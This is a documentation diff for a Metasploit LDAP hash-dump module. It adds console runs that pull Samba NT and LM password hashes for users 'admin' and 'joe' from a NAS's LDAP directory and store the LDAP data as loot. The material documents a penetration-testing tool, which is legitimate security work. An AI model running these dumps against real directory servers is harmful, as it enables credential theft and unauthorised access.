@@ -98,5 +98,45 @@ msf5 auxiliary(gather/ldap_hashdump) > run
 [+] Credentials found: admin:{SSHA}AZKja92fbuuB9SpRlHqaoXxbTc43Mzc2MDM1Ng==
 [*] Auxiliary module execution completed
 msf5 auxiliary(gather/ldap_hashdump) >
+```
 
+### NASDeluxe - NAS with Samba LM/NTLM hashes
+
+```
+msf5 auxiliary(gather/ldap_hashdump) > set USER_ATTR uid
+USER_ATTR => uid
+msf5 auxiliary(gather/ldap_hashdump) > set PASS_ATTR sambantpassword
+PASS_ATTR => sambantpassword
+msf5 auxiliary(gather/ldap_hashdump) > set RHOSTS [redacted_ip_address]
+RHOSTS => [redacted_ip_address]
+
+msf5 auxiliary(gather/ldap_hashdump) > run
+[*] Running module against [redacted_ip_address]
+
+[*] Discovering base DN automatically
+[*] Searching root DSE for base DN
+[+] Discovered base DN: dc=server,dc=nas
+[*] Dumping LDAP data from server at [redacted_ip_address]:389
+[*] Storing LDAP data in loot
+[+] Saved LDAP data to /home/hynek/.msf4/loot/20200726201006_default_[redacted_ip_address]_LDAPInformation_026574.txt
+[*] Searching for attribute: sambantpassword
+[*] Taking uid attribute as username
+[+] Credentials found: admin:209C6174DA490CAEB422F3FA5A7AE634
+[+] Credentials found: joe:58E8C758A4E67F34EF9C40944EB5535B
+[*] Auxiliary module execution completed
+
+msf5 auxiliary(gather/ldap_hashdump) > run
+[*] Running module against [redacted_ip_address]
+
+[*] Discovering base DN automatically
+[*] Searching root DSE for base DN
+[+] Discovered base DN: dc=server,dc=nas
+[*] Dumping LDAP data from server at [redacted_ip_address]:389
+[*] Storing LDAP data in loot
+[+] Saved LDAP data to /home/hynek/.msf4/loot/20200726201731_default_[redacted_ip_address]_LDAPInformation_427417.txt
+[*] Searching for attribute: sambalmpassword
+[*] Taking uid attribute as username
+[+] Credentials found: admin:F0D412BD764FFE81AAD3B435B51404EE
+[+] Credentials found: joe:3417BE166A79DDE2AAD3B435B51404EE
+[*] Auxiliary module execution completed
 ```
